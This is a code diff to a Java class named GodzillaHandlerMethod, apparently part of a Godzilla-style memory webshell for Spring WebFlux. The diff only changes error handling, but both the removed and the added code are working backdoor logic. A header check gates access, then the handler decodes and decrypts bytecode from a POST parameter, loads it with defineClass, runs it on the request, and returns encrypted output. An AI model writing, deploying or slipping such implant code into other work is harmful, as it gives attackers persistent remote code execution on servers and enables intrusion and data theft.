@@ -32,34 +32,31 @@ public class GodzillaHandlerMethod extends ClassLoader {
         if (value == null || !value.contains(headerValue)) {
             return ResponseEntity.notFound().build();
         }
-        try {
-            Object bufferStream = exchange.getFormData().flatMap(map -> {
-                StringBuilder result = new StringBuilder();
-                try {
-                    byte[] data = base64Decode(map.getFirst(pass));
-                    data = x(data, false);
-                    if (payload == null) {
-                        payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
-                    } else {
-                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                        Object f = payload.getDeclaredConstructor().newInstance();
-                        f.equals(arrOut);
-                        f.equals(data);
-                        f.equals(exchange.getRequest());
-                        result.append(md5.substring(0, 16));
-                        f.toString();
-                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
-                        result.append(md5.substring(16));
-                    }
-                } catch (Exception ex) {
-                    result.append(ex.getMessage());
+        Object bufferStream = exchange.getFormData().flatMap(map -> {
+            StringBuilder result = new StringBuilder();
+            try {
+                byte[] data = base64Decode(map.getFirst(pass));
+                data = x(data, false);
+                if (payload == null) {
+                    payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
+                } else {
+                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                    Object f = payload.getDeclaredConstructor().newInstance();
+                    f.equals(arrOut);
+                    f.equals(data);
+                    f.equals(exchange.getRequest());
+                    f.toString();
+                    result.append(md5.substring(0, 16));
+                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
+                    result.append(md5.substring(16));
                 }
-                return Mono.just(result.toString());
-            });
-            return ResponseEntity.ok(bufferStream);
-        } catch (Exception ex) {
-            return ResponseEntity.ok(ex.getMessage());
-        }
+            } catch (Throwable ex) {
+                ex.printStackTrace();
+                result.append(ex.getMessage());
+            }
+            return Mono.just(result.toString());
+        });
+        return ResponseEntity.ok(bufferStream);
     }
 
 
